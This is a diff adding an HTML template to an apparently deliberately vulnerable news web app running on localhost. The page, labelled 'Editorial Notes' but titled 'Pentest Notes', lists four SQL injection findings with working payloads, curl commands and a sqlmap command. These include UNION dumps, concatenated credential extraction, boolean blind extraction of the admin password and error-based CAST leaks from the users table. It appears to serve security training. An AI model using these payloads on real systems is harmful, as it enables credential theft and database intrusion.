@@ -1,0 +1,107 @@
+{{define "docs.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Editorial Notes – NewsHub</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header>
+  <a class="logo" href="/">News<span>Hub</span></a>
+  <nav>
+    <a href="/articles?cat=Politics">Politics</a>
+    <a href="/articles?cat=Technology">Technology</a>
+    <a href="/articles?cat=Economy">Economy</a>
+    <a href="/tags?tag=breaking">Breaking</a>
+    <a href="/comment" class="cta">Discuss</a>
+  </nav>
+</header>
+<main class="docs-main">
+  <h1>Pentest Notes – NewsHub</h1>
+  <p class="docs-intro">Internal exploitation reference for security assessment of this application.</p>
+
+  <div class="vuln-card">
+    <div class="vuln-header">
+      <span class="vuln-id">VULN-9</span>
+      <span class="vuln-type">UNION – Retrieving Data from Other Tables</span>
+    </div>
+    <p><strong>Endpoint:</strong> <code>GET /articles?cat=&lt;value&gt;</code></p>
+    <p><strong>Context:</strong> The <code>cat</code> parameter is injected into a 5-column SELECT (id, title, category, author, created_at). A UNION attack can pull rows from any other table.</p>
+    <p><strong>Goal:</strong> Extract credentials from the <code>users</code> table.</p>
+    <pre><code># Confirm columns
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+
+# Dump users table
+' UNION SELECT id::text,username,password,email,'x' FROM users--
+
+# cURL
+curl "http://localhost:8083/articles?cat=%27+UNION+SELECT+id%3A%3Atext%2Cusername%2Cpassword%2Cemail%2C%27x%27+FROM+users--"</code></pre>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-header">
+      <span class="vuln-id">VULN-10</span>
+      <span class="vuln-type">UNION – Multiple Values in a Single Column</span>
+    </div>
+    <p><strong>Endpoint:</strong> <code>GET /tags?tag=&lt;value&gt;</code></p>
+    <p><strong>Context:</strong> 3-column query (title, author, category) over a JOIN. Use PostgreSQL string concatenation <code>||</code> to pack multiple fields into one column.</p>
+    <pre><code># Verify 3 columns
+' UNION SELECT NULL,NULL,NULL--
+
+# Concatenate username + password + email into column 2
+' UNION SELECT NULL,username||'~'||password||'~'||email,NULL FROM users--
+
+# cURL
+curl "http://localhost:8083/tags?tag=%27+UNION+SELECT+NULL%2Cusername%7C%7C%27~%27%7C%7Cpassword%2CNULL+FROM+users--"</code></pre>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-header">
+      <span class="vuln-id">VULN-11</span>
+      <span class="vuln-type">Blind SQLi – Conditional Responses</span>
+    </div>
+    <p><strong>Endpoint:</strong> <code>GET /article?id=&lt;value&gt;</code></p>
+    <p><strong>Context:</strong> Boolean-based blind injection. When injected condition is TRUE the article renders; when FALSE the page shows "not found". Use SUBSTRING to extract secrets character by character.</p>
+    <pre><code># TRUE  → article displayed
+/article?id=1' AND '1'='1'--
+
+# FALSE → "not found"
+/article?id=1' AND '1'='2'--
+
+# Extract admin password first char
+/article?id=1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='N'--
+
+# Automate with sqlmap
+sqlmap -u "http://localhost:8083/article?id=1" --technique=B --dbms=postgresql --dump</code></pre>
+  </div>
+
+  <div class="vuln-card">
+    <div class="vuln-header">
+      <span class="vuln-id">VULN-12</span>
+      <span class="vuln-type">Blind SQLi – Conditional Errors</span>
+    </div>
+    <p><strong>Endpoint:</strong> <code>POST /comment</code> — field <code>article_id</code></p>
+    <p><strong>Context:</strong> The <code>article_id</code> value is embedded directly in an INSERT…SELECT. Injecting a CAST of a text value to INTEGER causes a PostgreSQL error that is reflected back in the UI, leaking data.</p>
+    <pre><code># Trigger CAST error to leak username
+article_id = 1 AND 1=CAST((SELECT username FROM users LIMIT 1) AS INTEGER)
+
+# Force error when condition is true
+article_id = 1 AND 1=(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS TEXT) ELSE '1' END)
+
+# cURL
+curl -X POST http://localhost:8083/comment \
+  -d "article_id=1 AND 1=CAST((SELECT username FROM users LIMIT 1) AS INTEGER)&author=x&content=y"</code></pre>
+  </div>
+
+  <div class="vuln-card info">
+    <p><strong>Database:</strong> app3_db &nbsp;|&nbsp; <strong>Tables:</strong> articles, tags, article_tags, comments, users &nbsp;|&nbsp; <strong>Sensitive:</strong> users(username, password, email, token)</p>
+  </div>
+</main>
+<footer>
+  <p>© 2024 NewsHub Media Group &nbsp;|&nbsp; <a href="/docs">Editorial Notes</a></p>
+</footer>
+<script src="/static/script.js"></script>
+</body>
+</html>
+{{end}}
